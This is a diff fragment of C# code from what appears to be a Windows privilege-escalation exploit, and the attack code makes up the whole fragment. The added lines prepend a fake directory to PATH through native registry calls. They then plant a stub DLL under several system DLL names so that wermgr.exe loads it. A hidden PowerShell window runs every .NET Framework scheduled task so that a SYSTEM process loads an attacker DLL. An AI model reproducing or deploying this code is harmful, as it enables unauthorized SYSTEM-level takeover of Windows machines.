@@ -292,13 +292,33 @@ if($r-eq 0){
 
         /* Trigger mscorsvw.exe (NGEN) as SYSTEM - it hosts CLR and will load our profiler DLL */
         Console.WriteLine("[*] Triggering .NET NGEN task (mscorsvw.exe as SYSTEM)...");
-        /* Run every task in .NET Framework folder - one of them runs mscorsvw.exe as SYSTEM */
+        /* Add fake dir to start of PATH so wermgr.exe loads our DLLs by name */
+        string sysPath = Environment.GetEnvironmentVariable("PATH") ?? "";
+        string fakePath = Path.Combine(runDir,"System32");
+        IntPtr hTK2 = OKey(TK, KEY_SET_VALUE);
+        if (hTK2!=IntPtr.Zero) {
+            var vn = new US("PATH");
+            string newPath = fakePath + ";" + sysPath;
+            var wb = System.Text.Encoding.Unicode.GetBytes(newPath+"\0");
+            NtSetValueKey(hTK2,ref vn,0,REG_SZ,wb,wb.Length); vn.Free();
+            NtClose(hTK2);
+            Console.WriteLine($"[+] PATH in VE: {fakePath};...");
+        }
+
+        /* Drop stub.dll under common DLL names wermgr.exe might load */
+        string[] dllNames = {"wlbsctrl.dll","wbemcomn.dll","dbgcore.dll","version.dll","netutils.dll"};
+        foreach (var d in dllNames)
+            try { File.Copy(dllPath, Path.Combine(fakePath,d), true); } catch {}
+        Console.WriteLine($"[+] Dropped stub.dll as {dllNames.Length} candidate DLLs");
+
+        /* Enumerate ALL .NET Framework tasks and run them */
         string ngenPs =
-            "try{" +
-            "$s=New-Object -ComObject Schedule.Service;$s.Connect();" +
+            "try{$s=New-Object -ComObject Schedule.Service;$s.Connect();" +
             "$f=$s.GetFolder('\\Microsoft\\Windows\\.NET Framework');" +
-            "foreach($t in $f.GetTasks(0)){$t.Run($null);Write-Host('[ngen]'+$t.Name)}" +
-            "}catch{Write-Host('err:'+$_)}";
+            "$n=$f.GetTasks(0).Count;" +
+            "Write-Host('tasks:'+$n);" +
+            "foreach($t in $f.GetTasks(0)){$t.Run($null);Write-Host('[run]'+$t.Name)}" +
+            "}catch{Write-Host('ngen-err:'+$_)}";
         var npsi = new System.Diagnostics.ProcessStartInfo("powershell.exe",
             $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{ngenPs}\"")
             {UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true,RedirectStandardError=true};
